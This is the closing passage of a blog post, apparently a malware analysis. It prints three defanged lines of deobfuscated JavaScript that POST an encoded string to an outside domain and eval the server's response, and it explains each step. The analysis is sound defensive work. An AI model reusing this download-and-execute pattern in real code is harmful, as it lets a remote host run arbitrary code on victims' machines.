<p>Performing the same action, the remaining three lines are (intentionally defanged)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#ae81ff">51</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">activex_object</span>[<span style="color:#e6db74">&#39;open&#39;</span>](<span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#e6db74">&#39;https://e9171.asset.tradingvein[.]xyz/subscribeEvent&#39;</span>, <span style="color:#f92672">!</span>[]), 
<span style="color:#ae81ff">52</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">activex_object</span>[<span style="color:#e6db74">&#39;setRequestHeader&#39;</span>](<span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>);
<span style="color:#ae81ff">122</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">activex_object</span>[<span style="color:#e6db74">&#39;send&#39;</span>](<span style="color:#e6db74">&#39;0fLZsUtGNjQj6htMDKjCPOqLbq6CaK8DLSt7/ur7qQ==&#39;</span>), <span style="color:#66d9ef">this</span>[<span style="color:#e6db74">&#39;eval&#39;</span>](<span style="color:#a6e22e">activex_object</span>[<span style="color:#e6db74">&#39;responseText&#39;</span>]);
</code></pre></div><p>We&rsquo;ve done it! Line 51 initializes a non-asynchronous POST request to a new domain and line 52 sets the Upgrade-Insecure-Requests header to 1, so HTTP will not be used as a fallback if HTTPS fails. Finally, line 122 sends a base64 encoded string to the domain and executes what is returned in the responseText.</p>
<h3 id="follow-up">Follow Up</h3>
<p>Unfortunately, I did not execute the payload on my VM so this is as far as I can go for now.<br>
I plan on running through the attack chain once again, but next time taking it a few steps further. Look for a part three in the future where I will capture and analyze the next phases.</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.ace63d93098bf623f7c286a9084a4c22bfc482944c734f87fe0b685c7c6c7fa0ad2edb028c3b4b60d3343720c8ab490b320ad7f8edf4f6e9a6b898fc529057a9.js" integrity="sha512-rOY9kwmL9iP3woapCEpMIr/EgpRMc0&#43;H/gtoXHxsf6CtLtsCjDtLYNM0NyDIq0kLMgrX&#43;O309ummuJj8UpBXqQ=="></script>



    </body>
</html>
